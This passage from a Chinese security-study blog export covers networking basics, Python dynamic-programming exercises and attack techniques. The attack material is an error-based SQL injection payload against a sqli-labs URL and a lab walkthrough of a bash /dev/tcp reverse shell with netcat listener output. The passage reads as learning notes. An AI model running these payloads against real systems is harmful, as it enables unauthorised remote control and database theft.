<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串</span><br><span class="line"></span><br><span class="line">start为起始位置</span><br><span class="line"></span><br><span class="line">length为长度</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>

<hr>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>计网基础</title>
    <url>/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a><strong>基本概念</strong></h2><p><strong>osi七层模型：</strong></p>
<p><strong>物理层-链路层-网络层-运输层-会话层-表示层-应用层</strong></p>
<p>只要遵循 OSI 标准，一个系统就可以和位于世界上任何地方的、也遵循这同一标准的其他任何系统进行通信。</p>
<p>但是OSI在市场化方面是失败的—过于复杂等因素</p>
<p><strong>TCP/IP 获得了最广泛的应用–四层体系结构</strong></p>
<p><strong>应用层–运输层–网际层–网络接口层</strong></p>
<p>还有折中的五层体系结构： <strong>物理层–数据链路层–网络层–运输层–应用层</strong></p>
<hr>
<p><strong>实体：</strong>表示任何可发送或接收信息 的硬件或软件进程</p>
<p>同一系统相邻两层的实体进行交互的地方，称为 <strong>服务访问点 SAP (Service Access Point)</strong></p>
<p><strong>PDU（protocol data unit）</strong>每一层使用自己层的协议和别的系统对应层相互通信，交换的信息叫做<strong>协议数据单</strong></p>
<p><strong>• 上三层：message 消息</strong> </p>
<p><strong>• 传输层：segment 数据段</strong></p>
<p><strong>• 网络层：packet 包</strong></p>
<p><strong>• 链路层：frame 帧</strong></p>
<p><strong>• 物理层：bit     比特流</strong></p>
<p>互联网组成 按工作方式划分为以下的两部分： </p>
<p><strong>(1)边缘部分</strong> 所有连接在互联网上的主机用户直接使用，进行通信和资源共享</p>
<p><strong>(2)核心部分</strong> 大量网络和连接网络的设备组成为边缘部分提供连通交换</p>
<p>互联网的边缘部分–两种通信方式 </p>
<p><strong>• 客户–服务器方式</strong>（<strong>C/S 方式）</strong> 即Client/Server方式 </p>
<p><strong>• 对等方式（P2P 方式）</strong> 即 Peer-to-Peer方式</p>
<hr>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a><strong>网络层</strong></h2><h3 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><strong>网际协议IP</strong></h3><p>与 IP 协议配套使用的还有三个协议： </p>
<p><strong>– 地址解析协议 ARP (Address Resolution Protocol)</strong> </p>
<p><strong>– 网际控制报文协议 ICMP (Internet Control Message Protocol)</strong> </p>
<p><strong>– 网际组管理协议 IGMP (Internet Group Management Protocol)</strong></p>
<p><strong>IP 地址 ::= { &lt;网络号&gt;, &lt;主机号&gt;}</strong> </p>
<p><strong>网络号net-id</strong>，它标志主机（或路由器）所连接到的网络</p>
<p><strong>主机号host-id</strong>，它标志该主机 （或路由器）</p>
<table>
<thead>
<tr>
<th></th>
<th>网络数目</th>
<th>第一个可用的网络号</th>
<th>最后一个课用的网络号</th>
<th>最大的主机数</th>
</tr>
</thead>
<tbody><tr>
<td>A类</td>
<td>126 (2^7-1)</td>
<td>1</td>
<td>126</td>
<td>1600万</td>
</tr>
<tr>
<td>B类</td>
<td>16383  (2^14-1)</td>
<td>128.1</td>
<td>191.255</td>
<td>65534</td>
</tr>
<tr>
<td>C类</td>
<td>2^21 -1</td>
<td>192.0.1</td>
<td>223.255.255</td>
<td>254</td>
</tr>
</tbody></table>
<p> <strong>特殊的IP地址</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这三个网段是私有地址，可以用于自己组网使用，这些地址主要用于企业内部网络中</span></span><br><span class="line"><span class="comment">#而使用这三个网段的计算机要上网必须要通过地址翻译（NAT），将私有地址翻译成公用合法的IP地址</span></span><br><span class="line"><span class="number">10</span>.*.*.*    <span class="number">172.16</span>.*.*    <span class="number">172.31</span>.*.*   <span class="number">192.168</span>.*.*  </span><br><span class="line"></span><br><span class="line"><span class="comment">#如果你的主机使用了DHCP功能自动获得一个ip地址，那么当你的DHCP服务器发生故障或响应时间太长而超出系统规定的一个时间，windows系统会为你分配这样一个地址</span></span><br><span class="line"><span class="number">169.254</span>.*.*</span><br><span class="line"></span><br><span class="line"><span class="comment">#限制广播地址。对本机来说，这个地址指本网段内(同一广播域)的所有主机。如果翻译成人类的语言，应该是这样：“这个房间里的所有人都注意了！”这个地址不能被路由器转发。</span></span><br><span class="line"><span class="number">255.255</span>.<span class="number">255.255</span></span><br></pre></td></tr></table></figure>

<p>在同一个局域网上的主机或路由器 他们IP地址的网络号必须是一样</p>
<p>路由器总是具有<strong>两个或两个以上的IP地址</strong>。 路由器的每一个接口都有一个不同网络号的IP地址</p>
<hr>
<h3 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><strong>地址解析协议 ARP</strong></h3><p>数据链路层的帧 必须使用硬件地址</p>
<p>每一个主机都有一个 ARP 高速缓存(ARP cache) </p>
<p>– 映射表–存放局域网上的各主机、路由器的 IP 地址和 硬件地址 </p>
<p>– 减少网络上的通信量 </p>
<p>• 主机 A 向本网的主机 B 发送 IP 数据报 </p>
<p>根据IP地址查找 ARP 高速缓存 </p>
<p>– 如有，将硬件地址写入 MAC 帧</p>
<p>– 如没有，ARP请求广播，如下图</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/1.png" style="zoom:80%;">

<p>• ARP 是解决<strong>同一个局域网上</strong>的主机或路由器 的 IP 地址和硬件地址的映射问题</p>
<p> • 如果所要找的主机和源主机不在同一个局域网上，那么网关来了</p>
<p> <strong>• 网关-</strong>-网络层以上使用的中间设备，很少用 </p>
<p>​          –路由器的旧称</p>
<p><strong>• 使用 ARP 的四种典型情况</strong></p>
<p> • 发送方是主机，要把IP数据报发送到本网络上的另一个主 机。这时用 ARP 找到目的主机的硬件地址。 </p>
<p>• 发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到网关硬件地址。剩下的工作由 网关来完成。 </p>
<p>• 发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。</p>
<p>• 发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上另一个路由器的硬 件地址。剩下的工作由这个路由器来完成</p>
<hr>
<h3 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a><strong>划分子网</strong></h3><p>早期IP 地址的设计确实不够合理<br>– 两级的 IP 地址不够灵活<br>– IP 地址空间的利用率有时很低<br>– 路由表太大，网络性能差</p>
<p><strong>划分子网(subnetting)</strong></p>
<p>– 互联网的正式标准协议 </p>
<p>– 在 IP 地址中增加 “子网号字段” subnet-id </p>
<p>– 子网号是借用若干位的主机号 </p>
<p>– 两级IP 地址变为三级 IP 地址<br>IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}</p>
<p>通常 划分子网是一个单位内部事情 外网看不见划分情况 </p>
<p>这个单位对外仍然表现为一个网络。 </p>
<p>– 从其他网络发送给本单位某个主机的 IP 数据报 </p>
<p>– 仍然根据 IP 数据报的<strong>目的网络号 net-id</strong>，先找到连接 在本单位网络上的路由器</p>
<p>– 单位网<strong>路由器</strong>收到后，再按目的网络号 net-id 和子网 号 subnet-id 找到目的子网</p>
<p>– 最后将 IP 数据报直接交付目的主机</p>
<p><strong>如何判断是否划分子网？</strong></p>
<p>• 从IP数据报的首部无法判断 </p>
<p><strong>• 使用子网掩码(subnet mask)</strong></p>
<hr>
<h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a><strong>运输层</strong></h2><p>TCP/IP 的运输层有两个不同的协议： </p>
<p><strong>(1)用户数据报协议 UDP   (User Datagram Protocol)</strong> </p>
<p>– 当运输层采用无连接的 UDP 协议时，这种逻辑通信信 道是一条不可靠信道。 </p>
<p><strong>(2) 传输控制协议 TCP     (Transmission Control Protocol)</strong> </p>
<p>– 当运输层采用面向连接的 TCP 协议时，尽管下面的网络是不可靠的（只提供尽最大努力服务），但这种逻辑通信信道就相当于一条全双工的可靠信道。</p>
<p>TCP 最主要的特点 </p>
<p>• TCP 是面向连接的           <strong>• 每一条 TCP 连接只能有两个端点</strong> 只能是点对点（一对一）</p>
<p>• TCP 提供可靠交付的服务 <strong>无差错，不丢失，不重复，按序到达</strong></p>
<p>• TCP 提供全双工通信 • TCP 是面向字节流的</p>
<h3 id="三次握手建立-TCP-连接"><a href="#三次握手建立-TCP-连接" class="headerlink" title="三次握手建立 TCP 连接"></a><strong>三次握手建立 TCP 连接</strong></h3><p><strong>A 的 TCP 向 B</strong> 发出连接请求报文段，其首部中的同步位 SYN = 1，并选择序号 seq = x，</p>
<p>表明传送数据时的第一个数据字节的序号是 x。</p>
<p><strong>B 的 TCP 收到连接</strong>请求报文段后，如同意，则 发回确认。</p>
<p>B 在确认报文段中应使 SYN = 1，使 ACK = 1， 其确认号ack = x + 1，自己选择的序号 seq = y。</p>
<p><strong>A 收到此报文段后</strong>向 B 给出确认，其ACK = 1， 确认号 ack = y + 1,  A 的 TCP 通知上层应用进程，连接已经建立</p>
<p><strong>B 的 TCP 收到主机A 的确认后</strong>，也通知其上层 应用进程：TCP 连接已经建立。</p>
<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/2.png" style="zoom:80%;">

<hr>
<p>三类端口 </p>
<p>• 熟知端口，数值一般为 0~1023。 </p>
<p>• 登记端口号，数值为1024~49151，为没有熟知 端口号的应用程序使用的。使用这个范围的端口 号必须在 IANA 登记，以防止重复。 </p>
<p>• 客户端口号或短暂端口号，数值为49152~65535， 留给客户进程选择暂时使用。当服务器进程收到 客户进程的报文时，就知道了客户进程所使用的 动态端口号。通信结束后，这个端口号可供其他 客户进程以后使</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a><strong>应用层</strong></h2><p>超文本传送协议 HTTP<br>• 用户点击鼠标后所发生的事件</p>
<p> (1) 浏览器分析超链指向页面的 URL。</p>
<p> (2) 浏览器向 DNS 请求解析 <a href="http://www.tsinghua.edu.cn" target="_blank" rel="noopener">www.tsinghua.edu.cn</a> 的 IP 地址。</p>
<p> (3) 域名系统 DNS 解析出清华大学服务器的 IP 地址。</p>
<p> (4) 浏览器与服务器建立 TCP 连接 </p>
<p>(5) 浏览器发出取文件命令： GET /chn/yxsz/index.htm。</p>
<p> (6) 服务器给出响应，把文件 index.htm 发给浏览器。</p>
<p> (7) TCP 连接释放。 </p>
<p>(8) 浏览器显示“清华大学院系设置”文件 index.htm 中的所 有文本。</p>
<p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服m务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
]]></content>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>web杂烩</title>
    <url>/2020/04/12/web%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>以下工具或命令不能实现端口转发是（）</p>
<p>端口转发（Port forwarding）是安全壳(SSH)  为网络安全通信使用的一种方法。SSH可以利用端口转发技术来传输其他TCP/IP协议的报文，当使用这种方式时，SSH就为其他服务在客户端和服务器端建立了一条安全的传输管道。端口转发利用本客户机端口映射到服务器端口来工作，SSH可以映射所有的服务器端口到本地端口，但要设置1024以下的端口需要根用户权限。在使用防火墙的网络中，如果设置为允许SSH服务通过(开启了22端口)，而阻断了其他服务，则被阻断的服务仍然可以通过端口转发技术转发数据包</p>
<p>ssh可以实现本地端口转发,远程端口转发,动态端口转发。  <a href="https://www.cnblogs.com/keerya/articles/7612715.html" target="_blank" rel="noopener">https://www.cnblogs.com/keerya/articles/7612715.html</a>     netsh端口转发:  <a href="https://www.jianshu.com/p/3b108844729e" target="_blank" rel="noopener">https://www.jianshu.com/p/3b108844729e</a>  </p>
<p>htran端口转发:  <a href="https://cloud.tencent.com/developer/article/1365274" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1365274</a>   </p>
<p>MSBuild: MSBuild 是 Microsoft 和 Visual Studio的生成系统。可以用来绕过AppLocker  <a href="https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5</a>   </p>
<p>更多端口转发工具  <a href="http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4" target="_blank" rel="noopener">http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4</a>   <a href="https://www.freebuf.com/articles/web/170970.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/170970.html</a></p>
<hr>
<p>php://phar是用来读取phar文件的 phar文件在使用特定的函数时会触发反序列化漏洞具体利用方法 <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<h2 id="反弹shell原理与实现"><a href="#反弹shell原理与实现" class="headerlink" title="反弹shell原理与实现"></a><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html" target="_blank" rel="noopener">反弹shell原理与实现</a></h2><p><strong>什么是反弹shell？</strong></p>
<p>　　反弹shell（reverse  shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse  shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<p><strong>为什么要反弹shell？</strong></p>
<p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>
<p>有如下情况：</p>
<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 </p>
<p>2.目标机器的ip动态改变，你不能持续控制。</p>
<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<p>==============================================================</p>
<p><strong>反弹shell实验</strong></p>
<p>环境：两台CentOS7.6服务器</p>
<ul>
<li>攻击端 hacker：10.201.61.194 </li>
<li>受害端 victim：10.201.61.195 </li>
</ul>
<p>\1. 攻击端监听一个端口：</p>
<p>[root@hacker ~]# <strong>nc -lvp 6767</strong></p>
<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
<p><em>Ncat: Listening on :::6767</em></p>
<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
<p>2.受害端生成一个反弹shell：</p>
<p>[root@victim ~]# <strong>bash -i &gt;&amp; /dev/tcp/10.201.61.194/6767 0&gt;&amp;1</strong></p>
<p>3.攻击端已获取到受害端的bash：</p>
<p>[root@hacker ~]# nc -lvp 6767</p>
<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
<p><em>Ncat: Listening on :::6767</em></p>
<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
<p><em>Ncat: Connection from 10.201.61.195.</em></p>
<p><em>Ncat: Connection from 10.201.61.195:46836.</em></p>
<p>[root@victim ~]#     //攻击端已获得受害端的远程交互式shell</p>
<p>[root@victim ~]# hostname</p>
<p>hostname</p>
<p>victim</p>
<p><strong>解释：</strong></p>
<p>\1. nc -lvp 6767</p>
<p> -l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
<p>\2. bash -i</p>
<p>-i interactive。即产生一个交互式的shell（bash）。</p>
<p>\3. /dev/tcp/IP/PORT </p>
<p>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 <code>bash</code> 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
<p><strong>通过以下4个小测试来分析反弹shell实现过程：</strong></p>
<p>（PS: 注意执行步骤顺序）</p>
<p><strong>测试1：</strong></p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //第三步<br>[root@victim ~]# </p>
<p>攻击端：</p>
<p>[root@hacker ~]# nc -lvp 5566   //第一步</p>
<p>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:49018.</p>
<p>victim   //测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。</p>
<p><strong>测试2：</strong></p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &lt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。<br>victim</p>
<p> 攻击端：</p>
<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:50412.<br>hostname    //第三步（攻击端执行命令）</p>
<p><strong>测试3</strong>：</p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1    //第二步<br>[root@victim ~]# hostname    //受害端回显命令<br>[root@victim ~]# id    //受害端回显命令<br>[root@victim ~]# hahaha    //受害端回显命令<br>bash: hahaha: command not found    //受害端回显命令。显示错误命令的输出。<br>[root@victim ~]# </p>
<p> 攻击端：</p>
<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:36792.<br>hostname    //第三步（攻击端执行命令）<br>victim<br>id    //第四步（攻击端执行命令）<br>uid=0(root) gid=0(root) groups=0(root)<br>hahaha    //第五步（执行一个错误的命令）</p>
<p>//测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。</p>
<p> <strong>测试4</strong>（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）： </p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 2&gt;&amp;1    //第二步。或 # bash -i &amp;&gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 （注：&amp;&gt;或&gt;&amp; 表示混合输出，即标准输出1 + 错误输出2）</p>
<p>攻击端：</p>
<p>[root@hacker <del>]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:51182.<br>[root@victim ~]# hostname    //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令</del><br>hostname<br>victim</p>
<p>//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用<del>~</del></p>
]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>python编程</title>
    <url>/2020/04/06/python%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="动态规划⭐"><a href="#动态规划⭐" class="headerlink" title="动态规划⭐"></a><strong>动态规划⭐</strong></h2><p>众所周知，牛妹有很多很多粉丝，粉丝送了很多很多礼物给牛妹，牛妹的礼物摆满了地板。  地板是N×MN\times MN×M的格子，每个格子有且只有一个礼物，牛妹已知每个礼物的体积。 地板的坐标是左上角(1,1) 右下角（N, M）。 牛妹只想要从屋子左上角走到右下角，每次走一步，每步只能向下走一步或者向右走一步或者向右下走一步，每次走过一个格子，拿起（并且必须拿上）这个格子上的礼物。牛妹想知道，她能走到最后拿起的所有礼物体积最小和是多少？ </p>
<p><strong>真的是非常简单的动态规划了，好久没敲代码了，虽然简单，但是也要熟悉呀，略菜备注较多哈~</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selectPresent</span><span class="params">(self ,presentVolumn)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> presentVolumn:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        N=len(presentVolumn)<span class="comment">#行数</span></span><br><span class="line">        M=len(presentVolumn[<span class="number">0</span>])<span class="comment">#列数</span></span><br><span class="line">        dp=[[<span class="number">0</span>]*M <span class="keyword">for</span> _ <span class="keyword">in</span> range(N)]  <span class="comment">#for _ in range(x) _表示占位符，功能只是用于循环</span></span><br><span class="line">        print(dp)  <span class="comment">#dp用于表示走到该格子，当前的总价值</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=presentVolumn[<span class="number">0</span>][<span class="number">0</span>] <span class="comment">#初始化1x1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            dp[i][<span class="number">0</span>]=dp[i<span class="number">-1</span>][<span class="number">0</span>]+presentVolumn[i][<span class="number">0</span>] <span class="comment">#初始化价值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">            dp[<span class="number">0</span>][i]=dp[<span class="number">0</span>][i<span class="number">-1</span>]+presentVolumn[<span class="number">0</span>][i] <span class="comment">#初始化</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">                dp[i][j]=min(dp[i<span class="number">-1</span>][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>])+presentVolumn[i][j] <span class="comment">#更新总价值，看左上角、左边、上边的最小值，进行更新</span></span><br><span class="line">        <span class="keyword">return</span> dp[i][j]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = int(input()) <span class="comment">#// 输入二维数组的行数</span></span><br><span class="line">    line = [[<span class="number">0</span>] * n] * n <span class="comment">#// 初始化二维数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        line[i] = input().split(<span class="string">" "</span>) <span class="comment">#输入二维数组，同行数字用空格分隔，不同行则用回车换行</span></span><br><span class="line">        line[i] = [int(j) <span class="keyword">for</span> j <span class="keyword">in</span> line[i]]<span class="comment"># // 将数组中的每一行转换成整型</span></span><br><span class="line">    print(line) <span class="comment">#// 打印二维数组1</span></span><br><span class="line">    print(Solution().selectPresent(line))</span><br></pre></td></tr></table></figure>

<h2 id="动态规划⭐⭐—最长公共子序列"><a href="#动态规划⭐⭐—最长公共子序列" class="headerlink" title="动态规划⭐⭐—最长公共子序列"></a><strong>动态规划⭐⭐—最长公共子序列</strong></h2><p>  众所周知，牛妹是一个offer收割姬，这次面试她遇到了这样的一个问题。 </p>
<p>  给了一个序列，让找出最长的“凸子序列” </p>
<p>  何为“凸子序列”：数列中有一个xi,使得所有x0&lt;x1&lt;x2….xi-1&lt;xi且xi&gt;xi+1&gt;xi+1&gt;….&gt;xn  </p>
<p>  eg：12345431,是山峰序列，12345234不是山峰序列 </p>
<p>  注：单调递增或单调递减序列也算山峰序列；单独一个数是长度为1的山峰序列</p>
<p><strong>纠结了很久，还是没好好审题，要的是从第一个元素开始就递增的，这样只需要判断后面的元素是否比它大就行</strong></p>
<p><strong>然后从右侧反向递增，同前面一样，找比最后一个元素大的，然后对两者进行相加，减去公共的，即可求解</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mountainSequence</span><span class="params">(self, numberList )</span>:</span></span><br><span class="line">        <span class="comment"># write code here</span></span><br><span class="line">        n = len(numberList)</span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">1</span> :<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        up=[<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n): <span class="comment">#正向递增</span></span><br><span class="line">            print(<span class="string">"------"</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="keyword">if</span> numberList[i]&gt;numberList[j] <span class="keyword">and</span> up[i]&lt;up[j]+<span class="number">1</span>: <span class="comment">#正推</span></span><br><span class="line">                    up[i]=up[j]+<span class="number">1</span></span><br><span class="line">        down=[<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>): <span class="comment">#反向递增 (10,-1,-1) ,注意这是是n-1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>,i,<span class="number">-1</span>): <span class="comment">#(10,10.9.8..0,-1)</span></span><br><span class="line">                <span class="keyword">if</span> numberList[j]&lt;numberList[i] <span class="keyword">and</span> down[i]&lt;down[j]+<span class="number">1</span>:</span><br><span class="line">                    down[i]=down[j]+<span class="number">1</span></span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            res=max(res,down[i]+up[i]<span class="number">-1</span>) <span class="comment">#交叉点重复了</span></span><br><span class="line">            print(res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2 id="动态规划⭐⭐—0-1背包问题"><a href="#动态规划⭐⭐—0-1背包问题" class="headerlink" title="动态规划⭐⭐—0-1背包问题"></a><strong>动态规划⭐⭐—0-1背包问题</strong></h2><p>众所周知，牛能和牛可乐经常收到小粉丝们送来的礼物，每个礼物有特定的价值，他俩想要尽可能按照自己所得价值来平均分配所有礼物。那么问题来了，在最优的情况下，他俩手中得到的礼物价值和的最小差值是多少呢？ </p>
<p>p.s 礼物都很珍贵，所以不可以拆开算哦 </p>
<p><strong>这题的本质就是0-1背包问题，只要将总价值向上取一半作为背包容量，尽可能的装满这个背包，则所求差值最小</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxPresent</span><span class="params">(presentVec)</span>:</span></span><br><span class="line">    volumn = sum(presentVec)</span><br><span class="line">    one_person = (volumn+<span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    dp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(one_person + <span class="number">1</span>)] <span class="comment">#背包容量</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(presentVec)): <span class="comment">#物品数量</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(one_person, presentVec[i] - <span class="number">1</span>, <span class="number">-1</span>): <span class="comment">#range(start, stop, step)  (背包容量,物体体积，倒过来)</span></span><br><span class="line">            <span class="keyword">if</span> dp[j - 